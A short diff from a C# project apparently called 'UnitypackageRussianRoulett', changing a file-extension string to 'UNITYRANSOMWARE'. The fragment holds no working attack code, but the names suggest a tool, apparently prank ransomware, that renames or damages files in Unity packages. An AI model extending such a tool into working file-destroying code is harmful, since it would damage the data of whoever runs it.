@@ -60,7 +60,7 @@ namespace UnitypackageRussianRoulett
         }
     
         // <summary>Random Filename</summary>
-        private static string[] fileextensions = { "𝐒𝐲𝐧𝐝𝐞𝐫𝐢𝐮𝐬" };
+        private static string[] fileextensions = { "UNITYRANSOMWARE" };
 
         private static T PickRandom<T>(this List<T> enumerable)
         {
